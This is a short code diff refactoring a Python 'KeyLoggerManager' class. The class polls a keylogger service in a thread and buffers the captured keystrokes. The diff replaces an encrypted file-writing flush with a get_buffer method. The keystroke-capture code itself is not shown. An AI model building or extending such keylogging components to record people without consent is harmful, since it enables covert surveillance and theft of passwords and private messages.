@@ -1,12 +1,9 @@
 import threading
 import time
-from datetime import datetime
 
 class KeyLoggerManager:
-    def __init__(self, KeyLoggerServise, FileWriter, encryption, interval=5):
-        self.KeyLoggerServise = KeyLoggerServise
-        self.FileWriter = FileWriter
-        self.encryption = encryption
+    def __init__(self, keylogger_service, interval=5):
+        self.keylogger_service = keylogger_service
         self.interval = interval
         self.buffer = []
         self.running = False
@@ -21,21 +18,14 @@ class KeyLoggerManager:
         self.running = False
         if self.thread:
             self.thread.join()
-        self._flush_buffer()
 
     def _run(self):
         while self.running:
-            events = self.KeyLoggerServise.get_logged_keys()
+            events = self.keylogger_service.get_events()
             self.buffer.extend(events)
-            if self.buffer:
-                self._flush_buffer()
             time.sleep(self.interval)
 
-    def _flush_buffer(self):
-        if not self.buffer:
-            return
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        raw_data = f"[{timestamp}] {''.join(self.buffer)}"
-        encrypted = self.encryption.encrypt(raw_data)
-        self.FileWriter.write(encrypted)
+    def get_buffer(self):
+        data = ''.join(self.buffer)
         self.buffer.clear()
+        return data
